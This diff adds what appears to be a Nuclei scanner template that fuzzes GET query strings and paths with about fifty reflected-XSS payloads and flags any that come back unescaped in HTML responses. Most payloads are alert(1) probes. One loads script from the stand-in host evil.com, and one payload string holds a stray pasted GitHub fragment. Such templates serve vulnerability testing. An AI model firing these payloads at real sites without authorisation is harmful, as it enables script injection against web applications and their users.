@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<script id=x tabindex=1 onbeforeactivate=alert(1)></script>"
+        - "<script>javascript:alert(1);</script>"
+        - "<video src=\"http://www.fuzze.com/flash/fuzze.swf\" type=\"application/x-shockwave-flash\" width=100% height=300></video><input type=\"hidden\" name=\"__xsspayload1__\" id=\"xxx\"><script>document.all[\"xxx\"].src = \"http://www.evil.com/some.js\";</script>"
+        - "<svg onload=javascript:alert(1)></svg>"
+        - "<address draggable=\"true\" ondragleave=\"alert(1)\">test</address>"
+        - "<style>:target {transform: rotate(180deg);}</style><output id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></output>"
+        - "<optgroup draggable=\"true\" ondragenter=\"alert(1)\">test</optgroup>"
+        - "&lt;title&gt;XSS Payload&lt;/title&gt;"
+        - "<video src=xss://x.y.z/xss-payload-list/README.md at master · payloadbox/xss-payload-list · GitHub\" autoplay=\"1\" onmouseover=\"alert(1)\">test</video>"
+        - "<picture onmouseenter=\"alert(1)\">test</picture><input id=x tabindex=1 onfocusin=alert(1)></input><output id=y type=text/javascript autofocus>javascript:alert(1)</output><plaintext draggable=true ondragend=alert(1)>test</plaintext><video onmousedowncapturemove=alert(1)>test</video><datalist onmouseleave=\"alert(1)\">test</datalist><progress onmouseupactivate=alert(1)>test</progress><textarea onkeyup=\"alert(1)\">test</textarea><details onmouseout=\"alert(1)\">test</details><menuitem onkeydown=\"alert(1)\">test</menuitem><input id=x tabindex=1 onfocusin=alert(1)></input>"
+        - "<video src=x:\\x0C..\\x0Cxscript\\x0Dalert(1)></video>"
+        - "<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem>"
+        - "<sup ondblclick=\"alert(1)\">test</sup>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>"
+        - "<html id=\"x\" onmouseover=\"alert(1)\">test</html>"
+        - "<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem><input id=y autofocus=true>"
+        - "<html oncontextmenu=\"alert(1)\">test</html><span draggable=\"true\" ondragleave=\"alert(1)\">test</span>"
+        - "<pre><code id=\"x\" contenteditable>javascript:alert(&quot;XSS&quot;)</code></pre>"
+        - "<sub oncopy=\"alert(1)\" contenteditable>test</sub>"
+        - "<optgroup id=x tabindex=1 onfocusout=alert(1)></optgroup><input type=text autocomplete=off value=[%1]>"
+        - "<sup id=x tabindex=1 onfocusin=alert(1)></sup>"
+        - "<style>:target {transform: rotate(180deg);}</style><pre id=x style=\"transition:transform 1s\" ontransitionrun=alert(1)></pre>"
+        - "<sup onbeforepaste=\"alert(1)\" contenteditable>test</sup><menuitem id=x></menuitem><input oncopymove=alert(1) contenteditable>test</input>"
+        - "<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>"
+        - "<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>"
+        - "<img src=\"javascript:alert(1)\">"
+        - "<style>:target {background-color: red;}</style><input id=x style=\"transition:background-color 2s\" ontransitioncancel=alert(1)></input>"
+        - "<style>:target {transform: rotate(180deg);}</style><svg id=x style=\"transition:transform 3s\" ontransitionrun=alert(1)></svg>"
+        - "<div id=x tabindex=1 onactivate=alert(1)></div><input id=y autofocus>"
+        - "<b onbeforepaste=\"alert(1)\" contenteditable>test</b><input id=x type=hidden>"
+        - "<IMG SRC=x onerror=javascript:alert(1)>"
+        - "<track onmouseout=\"alert(1)\">test</track>"
+        - "<IMG SRC=x onmouseover=\"alert(1)\">"
+        - "<frameset onload=\"alert(1)\">"
+        - "<style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></a>"
+        - "<frame onerror=\"javascript:alert(1)\">test</frame>"
+        - "<script onmouseout=\"alert(1)\">test</script><a href='javascript:alert(1)'>test</a>"
+        - "<p oncopy=\"alert(1)\" contenteditable>test</p>"
+        - "<input id=x tabindex=1 onbeforeactivate=alert(1)></input><input id=y autofocus> </input><input id=z autocomplete=\"off\" autocorrect=\"off\">"
+        - "<sup id=x tabindex=1 onfocusout=alert(1)></sup>"
+        - "<output onmouseout=\"alert(1)\">test</output>"
+        - "<template id=\"xss-payload-1\" onfocusin=alert(1)>test</template><input autofocus>"
+        - "<noscript style=\"transition:transform 3s\" ontransitionrun=alert(1)></noscript>"
+        - "<video draggable=\"true\" ondrag=\"alert(1)\">test</video>"
+        - "<script>\\x08javascript:alert(1)</script><script>\\x09javascript:\\x11alert(2)</script><script>\\x0Ajavascript:\\x12alert(3)</script><script>\\x0Bjavascript:\\x13alert(4)</script><script>\\x0Cjavascript:\\x14alert(5)</script><script>\\x0Djavascript:\\x15alert(6)</script><script>\\x08javascript:alert(\\'XSS\\')</script>"
+        - "<script>alert(1)</script>"
+        - "<iframe src=\"javascript:alert(1)\">"
+        - "<script>\\x0Bsrc\\x09document.location='http://www.google.com/';\\x07<\\/script>"
+        - "<style>:target {transform: rotate(180deg);}</style><h1 id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<font id=x tabindex=1 onfocusout=alert(1)></font>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
